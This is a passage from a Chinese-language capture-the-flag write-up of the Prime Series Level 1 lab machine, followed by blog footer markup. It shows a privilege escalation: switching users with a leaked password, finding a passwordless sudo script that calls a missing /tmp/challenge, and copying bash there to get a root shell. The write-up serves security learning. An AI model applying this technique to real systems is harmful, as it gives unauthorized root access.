<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/home/saket$ su saket</span><br><span class="line">su saket</span><br><span class="line">Password: tribute_to_ippsec</span><br><span class="line"></span><br><span class="line">saket@ubuntu:~$   </span><br><span class="line">saket@ubuntu:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> saket on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User saket may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/victor/undefeated_victor</span><br><span class="line">saket@ubuntu:~$</span><br></pre></td></tr></table></figure>
<ul>
<li>发现<code>/home/victor/undefeated_victor</code>不用密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:~$ sudo /home/victor/undefeated_victor</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line"><span class="keyword">if</span> you can defeat me <span class="keyword">then</span> challenge me <span class="keyword">in</span> front of you</span><br><span class="line">/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found</span><br><span class="line">saket@ubuntu:~$</span><br></pre></td></tr></table></figure>
<ul>
<li>没有<code>/tmp/challenge</code>这个文件，把bash拷贝到<code>/tmp/challenge</code>就可以以victor的权限命令执行了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/saket</span><br><span class="line">saket@ubuntu:~$ cp /bin/bash /tmp/challenge</span><br><span class="line">cp /bin/bash /tmp/challenge</span><br><span class="line">saket@ubuntu:~$ sudo /home/victor/undefeated_victor</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line"><span class="keyword">if</span> you can defeat me <span class="keyword">then</span> challenge me <span class="keyword">in</span> front of you</span><br><span class="line">root@ubuntu:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Prime-Series-Level-1"><span class="toc-number">1.</span> <span class="toc-text">Prime_Series_Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzz"><span class="toc-number">1.2.</span> <span class="toc-text">Fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#走正常流程"><span class="toc-number">1.3.</span> <span class="toc-text">走正常流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非EXP提权"><span class="toc-number">1.4.</span> <span class="toc-text">非EXP提权</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&text=Prime_Series_Level-1-Write-up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&is_video=false&description=Prime_Series_Level-1-Write-up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Prime_Series_Level-1-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&name=Prime_Series_Level-1-Write-up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Kali-Team
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-141810677-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
